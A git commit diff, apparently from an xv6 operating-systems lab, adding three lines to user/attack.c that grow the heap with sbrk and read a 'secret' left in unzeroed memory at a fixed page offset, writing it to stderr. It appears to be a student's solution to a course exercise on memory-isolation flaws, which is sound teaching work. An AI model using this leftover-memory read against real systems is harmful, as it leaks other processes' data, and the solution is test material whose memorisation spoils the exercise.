a413ecd82c6bf7d57c565303a4422d7ce50da81b
jixian <jixian.jia.lax@gmail.com>
2025-06-04 01:43:13 -0700

    finish attack

--- user/attack.c
+++ user/attack.c
@@ -8,6 +8,9 @@ main(int argc, char *argv[])
 {
   // your code here.  you should write the secret to fd 2 using write
   // (e.g., write(2, secret, 8)
+  char* end = sbrk(PGSIZE*32);
+  char* secret = end + 16 * PGSIZE + 32;
+  write(2, secret,8);
 
   exit(1);
 }
